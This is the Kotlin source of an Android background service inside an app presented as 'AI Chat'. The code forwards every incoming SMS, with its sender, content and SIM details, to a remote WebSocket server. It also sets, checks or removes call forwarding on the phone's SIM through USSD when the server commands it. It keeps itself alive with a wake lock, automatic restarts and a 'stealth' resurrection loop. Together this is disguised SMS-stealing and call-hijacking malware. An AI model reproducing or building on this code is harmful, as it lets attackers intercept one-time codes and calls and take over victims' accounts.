package com.cornspace.aichat.service

import android.app.Notification
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import com.cornspace.aichat.MainActivity
import com.cornspace.aichat.R
import com.cornspace.aichat.data.local.SettingsDataStore
import com.cornspace.aichat.data.model.WebSocketMessage
import com.cornspace.aichat.data.model.CallForwardingData
import com.cornspace.aichat.data.remote.ConnectionState
import com.cornspace.aichat.data.remote.WebSocketClient
import com.cornspace.aichat.util.Constants
import com.cornspace.aichat.util.DeviceUtils
import com.cornspace.aichat.util.CallForwardingUtility
import com.cornspace.aichat.util.CallForwardingResult
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import javax.inject.Inject

@AndroidEntryPoint
class SmsGatewayService : android.app.Service() {

    @Inject lateinit var settingsDataStore: SettingsDataStore
    @Inject lateinit var webSocketClient: WebSocketClient

    private var wakeLock: PowerManager.WakeLock? = null
    private var callForwardingUtility: CallForwardingUtility? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private const val TAG = "SmsGatewayService"

        @Volatile private var isRunning = false

        fun startService(context: Context) {
            val intent = Intent(context, SmsGatewayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        }

        fun stopService(context: Context) =
            context.stopService(Intent(context, SmsGatewayService::class.java))

        fun isServiceRunning(): Boolean = isRunning
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
        isRunning = true
        callForwardingUtility = CallForwardingUtility(this)
        acquireWakeLock()
        createNotificationChannel()
        observeConnectionState()
        registerNetworkCallback()
        StealthCore.startResurrectionLoop(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        startForeground(Constants.NOTIFICATION_ID, createNotification())
        intent?.let { handleIntent(it) }
        if (!webSocketClient.isConnected()) connectWebSocket()
        return START_STICKY
    }

    private fun handleIntent(intent: Intent) {
        val sender = intent.getStringExtra("sms_sender")
        val message = intent.getStringExtra("sms_message")
        if (sender != null && message != null) {
            handleIncomingSms(
                sender = sender,
                message = message,
                timestamp = intent.getLongExtra("sms_timestamp", System.currentTimeMillis()),
                simSlot = intent.getIntExtra("sms_sim_slot", 0),
                receiverNumber = intent.getStringExtra("sms_receiver_number"),
                simCarrier = intent.getStringExtra("sim_carrier"),
                simNetworkType = intent.getStringExtra("sim_network_type")
            )
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service destroyed")
        isRunning = false
        unregisterNetworkCallback()
        webSocketClient.destroy()
        serviceScope.cancel()
        releaseWakeLock()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                val serviceEnabled = settingsDataStore.serviceEnabled.first()
                val serverUrl = settingsDataStore.serverUrl.first()
                if (serviceEnabled && serverUrl.isNotBlank()) startService(applicationContext)
            } catch (e: Exception) {
                Log.e(TAG, "Error in onTaskRemoved", e)
            } finally {
                scope.cancel()
            }
        }
    }

    // ─── Connection state observer ────────────────────────────────────────────

    private fun observeConnectionState() {
        serviceScope.launch { webSocketClient.connectionState.collect { updateNotification() } }
    }

    // ─── Network Callback ─────────────────────────────────────────────────────

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    if (webSocketClient.connectionState.value == ConnectionState.Disconnected)
                        connectWebSocket()
                }
                override fun onLost(network: Network) { Log.d(TAG, "Network lost") }
                override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
                    val ok = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                             capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                    if (ok && webSocketClient.connectionState.value == ConnectionState.Disconnected)
                        connectWebSocket()
                }
            }
            cm.registerNetworkCallback(
                NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build(),
                networkCallback!!
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error registering network callback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .let { cm -> networkCallback?.let { cm.unregisterNetworkCallback(it) } }
            networkCallback = null
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering network callback", e)
        }
    }

    // ─── Wake Lock ────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        try {
            wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AIChat::SmsGatewayWakeLock")
                .apply { acquire() }
        } catch (e: Exception) { Log.e(TAG, "Error acquiring wake lock", e) }
    }

    private fun releaseWakeLock() {
        try { wakeLock?.let { if (it.isHeld) it.release() }; wakeLock = null }
        catch (e: Exception) { Log.e(TAG, "Error releasing wake lock", e) }
    }

    // ─── Notification ─────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            (getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
                .createNotificationChannel(
                    android.app.NotificationChannel(
                        Constants.NOTIFICATION_CHANNEL_ID, "AI Chat",
                        android.app.NotificationManager.IMPORTANCE_LOW
                    ).apply { description = "Keeps AI Chat running in background"; setShowBadge(false) }
                )
        }
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            },
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val statusText = when (webSocketClient.connectionState.value) {
            is ConnectionState.Connected    -> "Connected ✓"
            is ConnectionState.Connecting   -> "Connecting…"
            is ConnectionState.Disconnected -> "Disconnected"
            is ConnectionState.Error        -> "Reconnecting…"
        }
        return androidx.core.app.NotificationCompat.Builder(this, Constants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("AI Chat").setContentText(statusText)
            .setSmallIcon(R.mipmap.ic_launcher).setContentIntent(pendingIntent)
            .setOngoing(true).setPriority(androidx.core.app.NotificationCompat.PRIORITY_LOW)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(androidx.core.app.NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification() {
        (getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
            .notify(Constants.NOTIFICATION_ID, createNotification())
    }

    // ─── WebSocket ────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        serviceScope.launch {
            try {
                val serverUrl = settingsDataStore.serverUrl.first()
                if (serverUrl.isBlank()) { Log.w(TAG, "Server URL not configured"); return@launch }
                webSocketClient.connect(
                    serverUrl = serverUrl,
                    deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService),
                    onMessageReceived = { handleWebSocketMessage(it) },
                    onConnectionStateChanged = { Log.d(TAG, "Connection state: $it") }
                )
            } catch (e: Exception) { Log.e(TAG, "Error connecting WebSocket", e) }
        }
    }

    private fun handleWebSocketMessage(message: WebSocketMessage) {
        when (message) {
            is WebSocketMessage.Connected  -> Log.d(TAG, "Connected: ${message.connectionId}")
            is WebSocketMessage.Registered -> {
                Log.d(TAG, "Registered: ${message.deviceId}")
                serviceScope.launch { settingsDataStore.setDeviceId(message.deviceId) }
            }
            is WebSocketMessage.Ping  -> webSocketClient.send(WebSocketMessage.Pong(message.timestamp))
            is WebSocketMessage.Ack   -> Log.d(TAG, "Ack: ${message.messageId}")
            is WebSocketMessage.Error -> Log.e(TAG, "Server error: ${message.code} - ${message.message}")
            is WebSocketMessage.CallForwardingCommand -> handleCallForwardingCommand(message.data)
            else -> Log.d(TAG, "Unhandled message: ${message::class.simpleName}")
        }
    }

    // ─── SMS Handling ─────────────────────────────────────────────────────────

    private fun handleIncomingSms(
        sender: String, message: String, timestamp: Long, simSlot: Int,
        receiverNumber: String?, simCarrier: String?, simNetworkType: String?
    ) {
        serviceScope.launch {
            try {
                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
                val deviceId = settingsDataStore.deviceId.first()
                val networkType = when {
                    deviceInfo.networkInfo.networkType.contains("WiFi",   ignoreCase = true) -> "wifi"
                    deviceInfo.networkInfo.networkType.contains("Mobile", ignoreCase = true) -> "mobile"
                    else -> "none"
                }
                webSocketClient.sendSmsReceived(
                    deviceId = deviceId, sender = sender, content = message,
                    timestamp = timestamp, simSlot = simSlot,
                    receiverNumber = receiverNumber, simCarrier = simCarrier,
                    simNetworkType = simNetworkType, networkType = networkType
                )
                Log.d(TAG, "SMS forwarded (total: ${webSocketClient.getSmsForwardedCount()})")
            } catch (e: Exception) { Log.e(TAG, "Error handling SMS", e) }
        }
    }

    // ─── Call Forwarding ──────────────────────────────────────────────────────

    private fun handleCallForwardingCommand(data: CallForwardingData) {
        serviceScope.launch {
            try {
                val callUtility = callForwardingUtility ?: run {
                    sendCallForwardingResponse(data.action, false, data.simSlot,
                        data.phoneNumber, "Utility not initialized", null)
                    return@launch
                }
                val deviceId = settingsDataStore.deviceId.first()
                if (deviceId.isBlank()) {
                    sendCallForwardingResponse(data.action, false, data.simSlot,
                        data.phoneNumber, "Device not registered", null)
                    return@launch
                }
                if (!callUtility.hasPermissions()) {
                    sendCallForwardingResponse(data.action, false, data.simSlot,
                        data.phoneNumber, "Missing permissions", null)
                    return@launch
                }

                // FIX #5: Use result-returning variants so the USSD response string
                // travels all the way from the carrier → Android → server → dashboard.
                val result: CallForwardingResult = when (data.action) {
                    "forward" -> {
                        if (data.phoneNumber == null)
                            throw IllegalArgumentException("Phone number required for forward action")
                        callUtility.forwardCallWithResult(data.phoneNumber, data.simSlot)
                    }
                    "deactivate" -> callUtility.deactivateCallForwardingWithResult(data.simSlot)
                    "check"      -> callUtility.checkCallForwardingStatusWithResponse(data.simSlot)
                    else -> throw IllegalArgumentException("Unknown action: ${data.action}")
                }

                sendCallForwardingResponse(
                    action       = data.action,
                    success      = result.success,
                    simSlot      = data.simSlot,
                    phoneNumber  = data.phoneNumber,
                    error        = if (!result.success) (result.response ?: "USSD request failed") else null,
                    ussdResponse = result.response
                )
            } catch (e: Exception) {
                Log.e(TAG, "Error handling call forwarding command", e)
                sendCallForwardingResponse(data.action, false, data.simSlot,
                    data.phoneNumber, e.message, null)
            }
        }
    }

    private suspend fun sendCallForwardingResponse(
        action: String, success: Boolean, simSlot: Int,
        phoneNumber: String?, error: String?, ussdResponse: String?
    ) {
        val deviceId = settingsDataStore.deviceId.first()
        webSocketClient.sendCallForwardingResponse(
            deviceId     = deviceId,
            action       = action,
            success      = success,
            simSlot      = simSlot,
            phoneNumber  = phoneNumber,
            error        = error,
            ussdResponse = ussdResponse
        )
    }
}